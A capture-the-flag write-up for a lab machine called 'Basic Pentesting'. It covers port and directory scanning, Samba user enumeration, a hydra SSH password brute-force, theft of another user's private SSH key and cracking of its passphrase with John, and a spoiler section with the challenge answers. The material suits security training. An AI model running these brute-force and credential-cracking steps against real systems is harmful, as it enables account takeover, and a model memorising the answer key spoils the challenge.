# Basic Pentetesting

![](/CTF/1-Easy/basic_pentesting/images/Screenshot_2024-07-05_22-44-39.png)

```bash
export IP=10.10.21.92
```
--------------------------------------------------------------------------------
## Nmap

```bash
nmap -sC -sV -oN nmap.txt $IP -vvv
```

<details>
    <summary>Nmap result:</summary>

    ```bash
    # Nmap 7.94SVN scan initiated Fri Jul  5 22:46:57 2024 as: nmap -sC -sV -oN nmap.txt -vvv 10.10.21.92
    Nmap scan report for 10.10.21.92
    Host is up, received conn-refused (0.22s latency).
    Scanned at 2024-07-05 22:46:58 -03 for 88s
    Not shown: 994 closed tcp ports (conn-refused)
    PORT     STATE SERVICE     REASON  VERSION
    22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZXasCfWSXQ9lYiKbTNkPs0T+wFym2lZy229LllhY6iDLrjm7LIkhCcrlgnJQtLxl5NPhlHNVmwhlkcPPiAHwluhMVE5xKihQj3i+Ucx2IwiFvfmCz4AKsWlR6N8IZe55Ltw0lcH9ykuKZddg81X85EVsNbMacJNjjyxAtwQmJt1F5kB1B2ixgjLLOyNWafC5g1h6XbEgB2wiSRJ5UA8rOZaF28YcDVo0MQhsKpQG/5oPmQUsIeJTUA/XkoWCjvXZqHwv8XInQLQu3VXKgv735G+CJaKzplh7FZyXju8ViDSAY8gdhqpJommYxzqu9s1M31cmFg2fT5V1z9s4DP/vd
    |   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP0SXJpgwPf/e9AT9ri/dlAnkob4PqzMjl2Q9lZIVIXeEFJ9sfRkC+tgSjk9PwK0DUO3JU27pmtAkDL4Mtv9eZw=
    |   256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzy8ZacWXbPGeqtuiJCnPP0LYZYZlMj5D1ZY9ldg1wU
    80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html).
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    8009/tcp open  ajp13?      syn-ack
    | ajp-methods: 
    |_  Supported methods: GET HEAD POST OPTIONS
    8080/tcp open  http-proxy  syn-ack
    |_http-title: Apache Tomcat/9.0.7
    |_http-open-proxy: Proxy might be redirecting requests
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-favicon: Apache Tomcat
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
    |     HTTP/1.1 400 
    |     Content-Type: text/html;charset=utf-8
    |     Content-Language: en
    |     Content-Length: 2243
    |     Date: Sat, 06 Jul 2024 01:48:10 GMT
    |     Connection: close
    |     <!doctype html><html lang="en"><head><title>HTTP Status 400 
    |_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port8080-TCP:V=7.94SVN%I=7%D=7/5%Time=6688A258%P=x86_64-pc-linux-gnu%r(
    SF:DNSVersionBindReqTCP,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text
    SF:/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2022
    SF:43\r\nDate:\x20Sat,\x2006\x20Jul\x202024\x2001:48:10\x20GMT\r\nConnecti
    SF:on:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title
    SF:>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\
    SF:x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:w
    SF:hite;background-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Ta
    SF:homa,Arial,sans-serif;color:white;background-color:#525D76;font-size:16
    SF:px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgrou
    SF:nd-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,
    SF:sans-serif;color:black;background-color:white;}\x20b\x20{font-family:Ta
    SF:homa,Arial,sans-serif;color:white;background-color:#525D76;}\x20p\x20{f
    SF:ont-family:Tahoma,Arial,sans-serif;background:white;color:black;font-si
    SF:ze:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line
    SF:\x20{height:1px;background-color:#525D76;border:none;}</style></head><b
    SF:od")%r(DNSStatusRequestTCP,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x
    SF:20text/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:
    SF:\x202243\r\nDate:\x20Sat,\x2006\x20Jul\x202024\x2001:48:10\x20GMT\r\nCo
    SF:nnection:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head>
    SF:<title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><
    SF:style\x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;c
    SF:olor:white;background-color:#525D76;font-size:22px;}\x20h2\x20{font-fam
    SF:ily:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-s
    SF:ize:16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white;ba
    SF:ckground-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,
    SF:Arial,sans-serif;color:black;background-color:white;}\x20b\x20{font-fam
    SF:ily:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\x20p
    SF:\x20{font-family:Tahoma,Arial,sans-serif;background:white;color:black;f
    SF:ont-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20
    SF:\.line\x20{height:1px;background-color:#525D76;border:none;}</style></h
    SF:ead><bod");
    Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: basic2
    |   NetBIOS computer name: BASIC2\x00
    |   Domain name: \x00
    |   FQDN: basic2
    |_  System time: 2024-07-05T21:48:21-04:00
    | smb2-time: 
    |   date: 2024-07-06T01:48:21
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 39475/tcp): CLEAN (Couldn't connect)
    |   Check 2 (port 37829/tcp): CLEAN (Couldn't connect)
    |   Check 3 (port 31097/udp): CLEAN (Failed to receive data)
    |   Check 4 (port 60547/udp): CLEAN (Failed to receive data)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | Names:
    |   BASIC2<00>           Flags: <unique><active>
    |   BASIC2<03>           Flags: <unique><active>
    |   BASIC2<20>           Flags: <unique><active>
    |   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
    |   WORKGROUP<00>        Flags: <group><active>
    |   WORKGROUP<1d>        Flags: <unique><active>
    |   WORKGROUP<1e>        Flags: <group><active>
    | Statistics:
    |   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
    |   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
    |_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
    |_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 1s

    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Jul  5 22:48:26 2024 -- 1 IP address (1 host up) scanned in 89.07 seconds
    ```

</details>

I found a **samba** service running, let's get more details using `enum4linux`

--------------------------------------------------------------------------------
## Gobuster

```bash
gobuster dir --url $IP --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js -t 40 -o gobuster-php-html-txt-js.txt
```

```
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 158]
/development          (Status: 301) [Size: 316] [--> http://10.10.21.92/development/]
```

#### I discovered a directory listing and that there are weak passwords being used by users


<details>
    <summary>Directory Listing:</summary>

    http://10.10.21.92/development/j.txt
    
    
    ```
    For J:

        I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
        and I was able to crack your hash really easily. You know our password policy, so please follow
        it? Change that password ASAP.

        -K
    ```
</details>

--------------------------------------------------------------------------------
## Enum4linux

```bash
enum4linux -a $IP 
```

#### I found two users

<details>
    <summary>Users:</summary>

    ```
    S-1-22-1-1000 Unix User\kay (Local User)                                                                 
    S-1-22-1-1001 Unix User\jan (Local User)
    ```
</details>


--------------------------------------------------------------------------------
## Hydra


```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt -vV $IP ssh
```

#### Found the password

<details>
    <summary>Password:</summary>

    ```
        armando
    ```
    
</details>

--------------------------------------------------------------------------------
## SSH

#### Successful SSH login
<details>
    <summary>Successful login:</summary>

    ```bash
    $ ssh jan@$IP
    jan@basic2:~$ 
    ```
    
</details>

##### Found important content in user kay's folder
```bash
jan@basic2:/home/kay$ ls -Filha
total 48K
786930 drwxr-xr-x 5 kay  kay  4.0K Apr 23  2018 ./
655362 drwxr-xr-x 4 root root 4.0K Apr 19  2018 ../
793456 -rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
793583 -rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
792902 -rw-r--r-- 1 kay  kay  3.7K Apr 17  2018 .bashrc
793590 drwx------ 2 kay  kay  4.0K Apr 17  2018 .cache/
786444 -rw------- 1 root kay   119 Apr 23  2018 .lesshst
798919 drwxrwxr-x 2 kay  kay  4.0K Apr 23  2018 .nano/
798920 -rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
792307 -rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
798691 drwxr-xr-x 2 kay  kay  4.0K Apr 23  2018 .ssh/
793592 -rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
798922 -rw------- 1 root kay   538 Apr 23  2018 .viminfo

```

##### I rescued Kay's ssh key, I will try to log into her account
> password is pending, I will try to break it with John

--------------------------------------------------------------------------------
## John


```bash
$ ssh2john kay_id_rsa > hash 

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

$ chmod 600 kay_id_rsa
```

##### We found the password
<details>
    <summary>Password:</summary>

    ```
     beeswax
    ```
    
</details>

#### Login successfully and get the final password
<details>
    <summary>Final Password</summary>
        <p>
            <img src="/CTF/1-Easy/basic_pentesting/images/Screenshot_2024-07-06_00-00-41.png">
        </p>

</details>

--------------------------------------------------------------------------------

## Spoiler alert

<details>
    <summary>What is the name of the hidden directory on the web server(enter name without /)?</summary>

    ```
    development
    ```

</details>

<details>
    <summary>What is the username?</summary>

    ```
    jan
    ```

</details>

<details>
    <summary>What is the password?</summary>

    ```
    armando
    ```

</details>
<details>
    <summary>What service do you use to access the server(answer in abbreviation in all caps)?</summary>

    ```
    SSH
    ```

</details>
<details>
    <summary>What is the name of the other user you found(all lower case)?</summary>

    ```
    kay
    ```

</details>
<details>
    <summary>What is the final password you obtain?</summary>

    ```
    heresareallystrongpasswordthatfollowsthepasswordpolicy$$
    ```

</details>

